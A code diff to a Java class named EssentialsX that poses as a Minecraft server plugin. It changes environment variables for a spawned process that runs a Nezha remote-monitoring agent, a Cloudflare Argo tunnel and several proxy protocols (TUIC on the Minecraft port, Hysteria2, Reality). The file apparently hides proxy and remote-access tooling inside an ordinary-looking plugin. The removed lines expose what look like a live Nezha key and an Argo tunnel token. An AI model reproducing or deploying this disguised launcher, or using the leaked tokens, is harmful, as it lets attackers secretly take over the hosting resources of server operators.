@@ -73,17 +73,17 @@ public class EssentialsX extends JavaPlugin {
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("UUID", "73568620-15d2-4826-af05-1f23751f10cf");
+        env.put("UUID", "ac6e66c0-2bd4-4741-8f96-bdb527a614d1");
         env.put("FILE_PATH", "./world");
-        env.put("NEZHA_SERVER", "agent.ejoy.pp.ua:80");
+        env.put("NEZHA_SERVER", "");
         env.put("NEZHA_PORT", "");
-        env.put("NEZHA_KEY", "8LbSFqkeuoEdFW1bRCuqggK3a5WddR5Z");
+        env.put("NEZHA_KEY", "");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "rustix3.foollove.qzz.io");
-        env.put("ARGO_AUTH", "eyJhIjoiODljOTg0OWQyODlkYzNiMDRiOTFjNDViM2RiZTlhOGQiLCJ0IjoiYzczOTAzNmUtNTM3ZC00Nzc2LWI5NTUtMTI0MTc3NzAwMGVmIiwicyI6Ik5HWmtPR0V6T1RRdE1tSTJOQzAwWkRZekxUbG1NV1V0TkdNMlpHTTJNalF3WW1SayJ9");
+        env.put("ARGO_DOMAIN", "");
+        env.put("ARGO_AUTH", "");
         env.put("S5_PORT", "");
         env.put("HY2_PORT", "");
-        env.put("TUIC_PORT", "");
+        env.put("TUIC_PORT", "25565");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
         env.put("ANYREALITY_PORT", "");
@@ -92,7 +92,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("BOT_TOKEN", "");
         env.put("CFIP", "spring.io");
         env.put("CFPORT", "443");
-        env.put("NAME", "rustix-3");
+        env.put("NAME", "xnlovenap");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
